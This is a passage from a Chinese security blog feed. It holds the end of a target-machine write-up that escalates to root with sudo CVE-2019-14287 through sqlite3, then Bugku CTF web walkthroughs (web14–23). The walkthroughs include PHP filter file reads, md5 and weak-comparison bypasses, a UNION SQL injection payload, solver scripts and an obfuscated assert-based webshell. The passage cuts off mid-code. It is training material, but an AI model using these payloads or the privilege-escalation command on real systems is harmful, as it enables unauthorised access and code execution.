alt="image-20210310211703347"></p><p>1.8.21，在1.8.28版本之前的sudo存在一个cve漏洞，cve-2019-14287，这个漏洞使得，如果sudo配置为允许用户通过Runas规范中定义的ALL关键字来以任意用户身份运行命令的话，我们可以通过指定用户ID -1或4294967295来以root权限执行恶意命令。</p><p>总结一下，这里涉及到了sqlite3和低版本sudo的两个漏洞，关于sqilte3，存在一个返回shell命令行的漏洞，但想要以root身份返回一个shell，需要使用到sudo命令，sudo策略开放了我们可以无密码以任意非root身份使用sqlite3数据库，此时如果我们直接使用sudo，还是需要密码，但实际上虽然它指定了我们不能以root权限使用，却由于我们可以指定用户id-1来绕过限制，从而实现无密码使用sqilte，达到提权效果</p><p>这里我们利用这个cve-2019-14287，成功提权</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo -u#-<span class="hljs-number">1</span> sqlite3 <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> <span class="hljs-string">&#x27;.shell /bin/sh&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210310212250831.png" alt="image-20210310212250831"></p><p>来到/root目录下，查看flag</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210310212340979.png" alt="image-20210310212340979"></p>]]></content>
    
    
    
    <tags>
      
      <tag>靶机渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bugku web总结_1</title>
    <link href="/2021/05/13/bugku%20web%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93_2/"/>
    <url>/2021/05/13/bugku%20web%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93_2/</url>
    
    <content type="html"><![CDATA[<p>﻿## bugku web总结(14-24)</p><h4 id="web14"><a href="#web14" class="headerlink" title="web14:"></a>web14:</h4><p>打开题目，可以看到一个链接click me</p><p><img src="https://img-blog.csdnimg.cn/20210425101546603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><p>点击后显示了index.php，可能提示flag存在index.php中</p><p><img src="https://img-blog.csdnimg.cn/20210425101612732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><p>如上图我们还可以看到多了一个参数file，很像是文件包含，这里我们可以尝试使用php伪协议读取文件内容，放上一个介绍php伪协议的文章链接<a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p><p>构造payload：php://filter/read=convert.base64-encode/resource=index.php，其中read为读过滤器，此项为选填，这里选用了base64编码，防止无法直接传输，resource为必填，指定我们要读取的数据流</p><p>拿到一串base64编码</p><p><img src="https://img-blog.csdnimg.cn/20210425101638904.png#pic_center"><br>hackbar解码，可以看到源码中有一行注释，成功拿到flag</p><p><img src="https://img-blog.csdnimg.cn/20210425101704322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="20210416183207599.png"></p><h4 id="web15"><a href="#web15" class="headerlink" title="web15:"></a>web15:</h4><p>打开之后提示输入5位密码</p><p><img src="https://img-blog.csdnimg.cn/2021042510174222.png#pic_center"></p><p>直接burp扔给intruder爆破，没什么好说的</p><p><img src="https://img-blog.csdnimg.cn/20210425101801225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><p><img src="https://img-blog.csdnimg.cn/20210425101822483.png#pic_center"></p><h4 id="web16"><a href="#web16" class="headerlink" title="web16:"></a>web16:</h4><p>点开题目之后，给了一串md5值</p><p><img src="https://img-blog.csdnimg.cn/20210425101839747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><p>解密之后显示空密码，右键查看源代码也看不到什么特殊东西</p><p><img src="https://img-blog.csdnimg.cn/20210425101900144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><p>结合题目的名字，叫做备份是个好习惯，我们目录扫描一波后台，看看能不能发现备份文件</p><p>不出所料，有一个index.php.bak文件</p><p><img src="https://img-blog.csdnimg.cn/20210425101918491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><p>我们访问它，将其下载下来，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Created by PhpStorm.</span><br><span class="hljs-comment"> * User: Norse</span><br><span class="hljs-comment"> * Date: 2017/8/6</span><br><span class="hljs-comment"> * Time: 20:22</span><br><span class="hljs-comment">   */</span><br><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;    <span class="hljs-comment">//告诉我们flag文件</span><br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">//ini_set设置php.ini选项，此处参数display_error为报错回显</span><br><span class="hljs-variable">$str</span> = strstr(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>], <span class="hljs-string">&#x27;?&#x27;</span>);<span class="hljs-comment">//$_SERVER[&#x27;REQUEST_URI&#x27;]回显当前路径，strstr函  数为截取字符串，如此处为从?截取到字符串结束为止</span><br><span class="hljs-variable">$str</span> = substr(<span class="hljs-variable">$str</span>,<span class="hljs-number">1</span>);      <span class="hljs-comment">//substr也是截取字符串，此处表示从第一个开始(扔掉?)，截取到结尾</span><br><span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&#x27;key&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$str</span>); <span class="hljs-comment">//将变量str中的key替换为空</span><br>parse_str(<span class="hljs-variable">$str</span>);      <span class="hljs-comment">//parse_str函数将括号内的赋值语句直接转化为变量，并给它赋值，比如parse_str(a=1)，就会创建一个变量a，并赋值为1</span><br><span class="hljs-keyword">echo</span> md5(<span class="hljs-variable">$key1</span>);<span class="hljs-comment">//变量key1md5加密</span><br><br><span class="hljs-keyword">echo</span> md5(<span class="hljs-variable">$key2</span>);<span class="hljs-comment">//同上</span><br><span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$key1</span>) == md5(<span class="hljs-variable">$key2</span>) &amp;&amp; <span class="hljs-variable">$key1</span> !== <span class="hljs-variable">$key2</span>)&#123;<span class="hljs-comment">//md5加密后的key1和key2相等，原值不相等</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>.<span class="hljs-string">&quot;取得flag&quot;</span>;<span class="hljs-comment">//打印flag</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里既要key1和key2的md5值相等，原值又不能相等，有两个思路，一是利用md5()函数对数组不起效，将两个变量以数组形式输入，这样两个md5()都返回null，满足相等条件</p><p>payload：?kekeyy1[]=12agh&amp;kekeyy2[]=123ccnjgg</p><p>二是利用php在处理长的字符串时会转换成科学计数法，我们可以找两个md5值是0e开头的，它在解析时会当做0的xx次方，都是0，满足条件</p><p>payload：?kekeyy1=240610708&amp;kekeyy2=s155964671a</p><h4 id="web17"><a href="#web17" class="headerlink" title="web17:"></a>web17:</h4><p>点开题目之后，给了一个成绩查询页面</p><p><img src="https://img-blog.csdnimg.cn/20210425101943849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><p>很自然的想到sql注入，经测试是个字符型的，无任何过滤，没啥好说的，手注、sqlmap均可</p><p>最后得到flag，payload：0’ union select 1,2,3,skctf_flag from fl4g#</p><p><img src="https://img-blog.csdnimg.cn/20210425102005106.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><h4 id="web18："><a href="#web18：" class="headerlink" title="web18："></a>web18：</h4><p>点开题目之后，给出一个算式，让我们2s给出结果</p><p><img src="https://img-blog.csdnimg.cn/20210425102029992.png#pic_center"></p><p>很显然手工做不到，但是可以借助脚本获取数值之后计算传参，拿到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests <span class="hljs-comment">#引入request库</span><br><span class="hljs-keyword">import</span> re <span class="hljs-comment">#引入re库</span><br>url = <span class="hljs-string">&#x27;&#x27;&#x27;http://114.67.246.176:10736/&#x27;&#x27;&#x27;</span><br>s = requests.session()  <span class="hljs-comment">#用session会话保持表达式</span><br>retuen = s.get(url)<br>equation = re.search(<span class="hljs-string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>,retuen.text).group()<br>result = <span class="hljs-built_in">eval</span>(equation)<span class="hljs-comment">#eval()函数用来执行一个字符串表达式,并返回表达式的值。</span><br><br>key = &#123;<span class="hljs-string">&#x27;value&#x27;</span>:result&#125;<span class="hljs-comment">#创建一个字典类型用于传参</span><br>flag = s.post(url,data=key)<span class="hljs-comment">#用post方法传上去</span><br><br><span class="hljs-built_in">print</span>(flag.text)<br></code></pre></td></tr></table></figure><h4 id="web19："><a href="#web19：" class="headerlink" title="web19："></a>web19：</h4><p>打开题目之后，会提示我们快一点，bp抓包查看返回信息，可以在header中看到一串类似flag的东西</p><p><img src="https://img-blog.csdnimg.cn/20210425102051662.png#pic_center"></p><p>base64两次解密后会变成一串数字，提交上去也不对，把请求包再send一次，会发现flag会变，好吧，确实速度要快，和上一题基本一个思路，下面给出脚本代码</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br>url = <span class="hljs-string">&quot;http://114.67.246.176:17056/&quot;</span><br>r = requests.Session()<br>headers = r.<span class="hljs-built_in">get</span>(url).headers<br>str1 = base64.b64decode(headers[<span class="hljs-string">&#x27;flag&#x27;</span>])<br>str2 = base64.b64decode(repr(str1).<span class="hljs-built_in">split</span>(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">1</span>]) # repr()函数将对象转化为供解释器读取的形式(Bety-&gt;<span class="hljs-built_in">str</span>)<br>data = &#123;<span class="hljs-string">&#x27;margin&#x27;</span>:str2&#125;<br><span class="hljs-built_in">print</span> (r.post(url,data).<span class="hljs-built_in">text</span>)<br></code></pre></td></tr></table></figure><p>python3运行，成功拿到flag</p><h4 id="web20："><a href="#web20：" class="headerlink" title="web20："></a>web20：</h4><p>打开题目之后，会给出一长串不明意义的字符串，右键查看源码也并没有发现什么</p><p><img src="https://img-blog.csdnimg.cn/2021042510211069.png#pic_center"></p><p>观察url，有两个参数，一个line是空的没有赋值，另一个filename给了一串base64编码：a2V5cy50eHQ=，解码之后得到keys.txt，将文件名换为同样base64加密后的index.php，可以看到一个标签”&lt;?php”，可以确定此处能够查看源码，依次改变line值，最后可以读出整段源码，如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$file</span>=base64_decode(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]:<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-variable">$line</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;line&#x27;</span>])?intval(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;line&#x27;</span>]):<span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>==<span class="hljs-string">&#x27;&#x27;</span>) header(<span class="hljs-string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);<br><span class="hljs-variable">$file_list</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;0&#x27;</span> =&gt;<span class="hljs-string">&#x27;keys.txt&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span> =&gt;<span class="hljs-string">&#x27;index.php&#x27;</span>,);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;margin&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;margin&#x27;</span>]==<span class="hljs-string">&#x27;margin&#x27;</span>)&#123; <span class="hljs-comment">#当cookie为margin=margin时</span><br><span class="hljs-variable">$file_list</span>[<span class="hljs-number">2</span>]=<span class="hljs-string">&#x27;keys.php&#x27;</span>;&#125;                    <span class="hljs-comment">#给file_list[2]增加keys.php</span><br><span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$file_list</span>))&#123;<br><span class="hljs-variable">$fa</span> = file(<span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$fa</span>[<span class="hljs-variable">$line</span>];&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>从代码中可以看到，当cookie为margin=margin时，会在file_list[2]数组中增加keys.php的值</p><p>我们照做，使用hackbar或burp抓包添加cookie值后，查看返回包或返回页面源码，即可拿到flag</p><h4 id="web21："><a href="#web21：" class="headerlink" title="web21："></a>web21：</h4><p>点开之后没看到啥提示信息</p><p><img src="https://img-blog.csdnimg.cn/20210425102136453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><p>右键查看源码，可以看到提示了一个1p.html</p><p><img src="https://img-blog.csdnimg.cn/20210425102204250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><p>直接访问此页面的话，会跳转至bugku的首页，我们用burp抓包，将请求页面替换为1p.html</p><p><img src="https://img-blog.csdnimg.cn/20210425102223165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><p>返回的数据包中包含一串url编码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">HTML</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">HEAD</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span> <span class="hljs-attr">LANGUAGE</span>=<span class="hljs-string">&quot;Javascript&quot;</span>&gt;</span><br>&lt;!--<br><span class="javascript"><span class="hljs-keyword">var</span> Words =<span class="hljs-string">&quot;%3Cscript%3Ewindow.location.href%3D&#x27;http%3A%2F%2Fwww.bugku.com&#x27;%3B%3C%2Fscript%3E%20%0A%3C!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--%3E&quot;</span> </span><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">OutWord</span>(<span class="hljs-params"></span>)</span></span><br>&#123;<br><span class="javascript"><span class="hljs-keyword">var</span> NewWords;</span><br><span class="javascript">NewWords = <span class="hljs-built_in">unescape</span>(Words);</span><br><span class="javascript"><span class="hljs-built_in">document</span>.write(NewWords);</span><br>&#125; <br>OutWord();<br><span class="javascript"><span class="hljs-comment">// --&gt;</span></span><br><span class="hljs-tag">&lt;/<span class="hljs-name">SCRIPT</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">HEAD</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">BODY</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">BODY</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">HTML</span>&gt;</span><br></code></pre></td></tr></table></figure><p>解码之后得到一串注释</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.location.href=<span class="hljs-string">&#x27;http://www.bugku.com&#x27;</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <br><span class="hljs-comment">&lt;!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--&gt;</span>&quot;<br></code></pre></td></tr></table></figure><p>将注释base64解码，终于得到源码</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs stata">&quot;;<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[&#x27;id&#x27;])     <span class="hljs-comment">//变量id不为空</span><br>&#123;<br>header(&#x27;Location: hello.php?id=1&#x27;);<br><span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[&#x27;id&#x27;];<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[&#x27;a&#x27;];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[&#x27;b&#x27;];<br><span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$a</span>,&#x27;.&#x27;))   <span class="hljs-comment">//变量a中不含有.</span><br>&#123;<br>echo &#x27;<span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span>&#x27;;<br><span class="hljs-keyword">return</span> ;<br>&#125;<br><span class="hljs-variable">$data</span> = @file_get_contents(<span class="hljs-variable">$a</span>,&#x27;r&#x27;);     <span class="hljs-comment">//将变量a的值读入$data</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>==<span class="hljs-string">&quot;bugku is a nice plateform!&quot;</span> and <span class="hljs-variable">$id</span>==0 and <span class="hljs-built_in">strlen</span>(<span class="hljs-variable">$b</span>)&gt;5 and eregi(<span class="hljs-string">&quot;111&quot;</span>.<span class="hljs-built_in">substr</span>(<span class="hljs-variable">$b</span>,0,1),<span class="hljs-string">&quot;1114&quot;</span>) and <span class="hljs-built_in">substr</span>(<span class="hljs-variable">$b</span>,0,1)!=4)  <span class="hljs-comment">//①</span><br>&#123;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&#123;***********&#125;&quot;</span><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;never never never give up !!!&quot;</span>;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>①：首先要求data的值，即a的内容为bugku is a nice plateform!，id不为0，且长度大于5，substr($b,0,1)为截取b的第一个字符(从第0个开始读取1个)，111+b的第一个字符需要在1114中出现，且b的第一个字符不能为4</p><p>总结一下，想要输出flag，必须满足几个条件：a要为bugku is a nice plateform!，id不能为空但需要id<code>==</code>0，此处可以使用0e1234来绕过（会识别为科学计数法），也可以使用0abc来绕过，php是弱类型语言，数字和字符(串)的比较是存在类型转换的，对字符串来说是以开头的数字为准，所以在松散(<code>==</code>)比较中，0<code>==</code>0abc是正确的，详情可以百度<code>==</code>和<code>===</code>的差别，最后还要满足上文①中b的要求，这里可以用.12345或*12345来绕过，这两个符号为php的通配符，放在此处取第一个字符后会被当成是任意字符</p><p>最终payload：?id=0e123&amp;a=php://input&amp;b=.12345，另外需要在下面加上post传参bugku is a nice plateform!</p><p>得到flag</p><p><img src="https://img-blog.csdnimg.cn/20210425102358596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><h4 id="web22："><a href="#web22：" class="headerlink" title="web22："></a>web22：</h4><p>这题并没有把提示放在题目中，而是放在了题目入口处</p><p>送给大家一个过狗一句话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$poc</span>=<span class="hljs-string">&quot;a#s#s#e#r#t&quot;</span>; <span class="hljs-variable">$poc_1</span>=explode(<span class="hljs-string">&quot;#&quot;</span>,<span class="hljs-variable">$poc</span>); <span class="hljs-variable">$poc_2</span>=<span class="hljs-variable">$poc_1</span>[0].<span class="hljs-variable">$poc_1</span>[1].<span class="hljs-variable">$poc_1</span>[2].<span class="hljs-variable">$poc_1</span>[3].<span class="hljs-variable">$poc_1</span>[4].<span class="hljs-variable">$poc_1</span>[5]; <span class="hljs-variable">$poc_2</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>])<br></code></pre></td></tr></table></figure><p>分析一下，这一串代码总结下来：</p><p>1.<code>$poc=a#s#s#e#r#t</code></p><p>2.<code>$poc_1=explode(&quot;#&quot;,$poc)</code>，这个函数的意思是以#为定界符，分隔字符串<code>$poc</code>，即<code>$poc_1=assert</code></p><p>3.<code>$poc_2=$poc_1=assert，$poc_2($_GET[&#39;s&#39;])</code>的含义就是<code>assert($\_GET[&#39;s&#39;])</code>，assert函数可以进行代码执行</p><p>那接下来就好办了，先dir看下当前目录下的文件</p><p><img src="https://img-blog.csdnimg.cn/20210425102545534.png#pic_center"></p><p>看到了flag文件，直接cat查看，拿到flag</p><p><img src="https://img-blog.csdnimg.cn/20210425102605165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><h4 id="web23："><a href="#web23：" class="headerlink" title="web23："></a>web23：</h4><p>点击进入题目，直接给了一段源码</p><p><img src="https://img-blog.csdnimg.cn/20210425102630421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 